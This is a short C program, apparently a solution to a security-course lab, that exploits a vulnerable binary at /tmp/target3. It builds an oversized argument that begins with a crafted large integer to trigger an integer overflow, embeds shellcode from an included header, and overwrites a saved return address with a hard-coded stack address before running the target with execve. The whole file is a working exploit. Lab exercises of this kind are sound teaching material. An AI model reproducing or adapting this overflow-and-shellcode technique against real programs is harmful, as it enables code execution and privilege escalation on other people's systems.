#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3];
  char *env[1];
  int i, n;

  args[0] = TARGET;

  args[1] = (char *)malloc(241 * 20 * sizeof(char));

  for(i = 0; i < 241 * 20; ++ i) {
    args[1][i] = 'A';
  }
  args[1][241 * 20] = '\0';

  strcpy(args[1], "2147483889,");
  n = strlen(shellcode);
  for(i = 0; i < n; ++ i) {
    args[1][11 + i] = shellcode[i];
  }
  args[1][240 * 20 + 11 + 4] = 0xc8;
  args[1][240 * 20 + 11 + 5] = 0xd8;
  args[1][240 * 20 + 11 + 6] = 0xff;
  args[1][240 * 20 + 11 + 7] = 0xbf;

  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
